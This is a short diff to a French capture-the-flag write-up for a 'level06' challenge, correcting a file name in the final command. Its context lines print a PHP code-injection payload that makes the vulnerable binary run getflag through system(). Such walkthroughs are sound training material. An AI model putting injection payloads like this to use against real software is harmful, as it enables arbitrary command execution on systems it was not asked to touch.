@@ -25,4 +25,4 @@ pour executer getflag avec la commande system de php, on devra ecrire : [x {\${s
 
 echo "[x {\${system(getflag)}}]" > /tmp/fichierquidoitcontenirleflag
 
-./level06 /tmp/fichierquicontenirleflag
+./level06 /tmp/fichierquidoitcontenirleflag
